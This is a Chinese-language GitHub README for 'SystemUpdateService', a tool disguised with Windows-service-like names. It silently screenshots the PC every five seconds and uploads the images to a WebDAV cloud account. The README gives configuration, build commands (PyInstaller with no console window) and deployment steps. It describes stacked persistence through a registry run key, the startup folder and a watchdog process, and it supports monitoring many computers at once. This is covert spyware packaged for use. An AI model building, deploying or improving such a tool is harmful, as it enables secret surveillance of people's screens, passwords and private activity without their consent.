# SystemUpdateService

[![Build SystemUpdateService](https://github.com/steve@bugbank.cn/SystemUpdateService/actions/workflows/build.yml/badge.svg)](https://github.com/steve@bugbank.cn/SystemUpdateService/actions/workflows/build.yml)

Windows 系统更新同步服务 - 用于同步系统更新日志和状态信息

## 🚀 快速开始

### 方法一：下载预编译版本（推荐）

1. 前往 [Releases](https://github.com/steve@bugbank.cn/SystemUpdateService/releases) 页面
2. 下载最新的 `SystemUpdateService-Windows.zip`
3. 解压到任意目录
4. 编辑 `config.json` 配置 WebDAV 信息
5. 以管理员身份运行 `autostart.bat`

### 方法二：使用 GitHub Actions 自动编译

1. Fork 这个仓库到您的 GitHub 账户
2. 推送代码或手动触发 Actions
3. 等待编译完成（约 3-5 分钟）
4. 在 Actions 页面下载编译好的文件

## 📁 项目结构

```
SystemUpdateService/
├── SystemUpdateService.py           # 主程序：截图、压缩、上传
├── WindowsSyncService.py           # 守护进程：监控主程序
├── config.json                     # 配置文件
├── autostart.bat                   # 自启动安装脚本
├── .github/workflows/build.yml     # GitHub Actions 编译配置
├── README.md                       # 项目说明
└── INSTALLATION_GUIDE.md          # 详细安装指南
```

## ⚙️ 配置说明

编辑 `config.json` 文件：

```json
{
    "webdav": {
        "url": "https://dav.jianguoyun.com/dav/",
        "username": "your_email@example.com",
        "password": "your_app_password",
        "remote_path": "/ScreenCaptures/"
    },
    "screenshot": {
        "interval_seconds": 5,
        "quality": 10,
        "max_width": 1920,
        "max_height": 1080
    }
}
```

### 获取坚果云 WebDAV 信息

1. 登录坚果云网页版
2. 进入 "账户信息" → "安全选项"
3. 添加应用密码
4. 使用邮箱作为用户名，应用密码作为密码

## 🔧 功能特性

### 主要功能
- ✅ 每 5 秒自动截图
- ✅ WebP 格式压缩，节省流量
- ✅ 自动上传到坚果云
- ✅ 上传失败自动缓存重试
- ✅ 完全后台运行，无界面

### 文件命名
- 格式：`计算机名_YYYYMMDD_HHMMSS.webp`
- 示例：`DESKTOP-ABC123_20241220_143052.webp`
- 支持多台电脑同时使用

### 自启动机制
- 注册表启动项
- 启动文件夹
- 守护进程监控
- 多重保障确保稳定运行

## 🛠️ 开发说明

### 本地开发环境

```bash
# 安装依赖
pip install mss==9.0.1 Pillow==10.1.0 requests==2.31.0 psutil==5.9.6 schedule==1.2.0

# 运行主程序
python SystemUpdateService.py

# 运行守护进程
python WindowsSyncService.py
```

### 手动编译

```bash
# 安装 PyInstaller
pip install pyinstaller==6.8.0

# 编译主程序
pyinstaller --onefile --noconsole --name SystemUpdateService SystemUpdateService.py

# 编译守护进程
pyinstaller --onefile --noconsole --name WindowsSyncService WindowsSyncService.py
```

## 📋 使用 GitHub Actions 编译

### 步骤详解

1. **Fork 仓库**
   - 点击右上角 "Fork" 按钮
   - 将仓库 Fork 到您的账户

2. **触发编译**
   - 推送代码到 main/master 分支
   - 或在 Actions 页面手动触发

3. **下载结果**
   - 编译完成后，在 Actions 页面下载 Artifacts
   - 或在 Releases 页面下载自动发布的版本

4. **编译过程**
   ```
   ✅ 设置 Python 3.11 环境
   ✅ 安装所有依赖包
   ✅ 创建版本信息文件
   ✅ 编译两个 exe 文件
   ✅ 打包分发文件
   ✅ 自动创建 Release
   ```

### 编译时间
- 通常需要 3-5 分钟
- 完全免费，无需本地环境
- 支持并行编译多个版本

## 🔍 故障排除

### 常见问题

1. **编译失败**
   - 检查 Python 版本兼容性
   - 确认依赖包版本正确
   - 查看 Actions 日志详细错误

2. **运行问题**
   - 检查 config.json 格式
   - 验证 WebDAV 凭据
   - 查看日志文件

3. **上传失败**
   - 测试网络连接
   - 确认坚果云配置
   - 检查远程目录权限

## 📞 技术支持

- 查看 [Issues](https://github.com/steve@bugbank.cn/SystemUpdateService/issues) 页面
- 提交新的问题报告
- 查看详细的安装指南

## 📄 许可证

本项目仅供学习和研究使用。

---

**注意：请将 `steve@bugbank.cn` 替换为您的 GitHub 用户名**
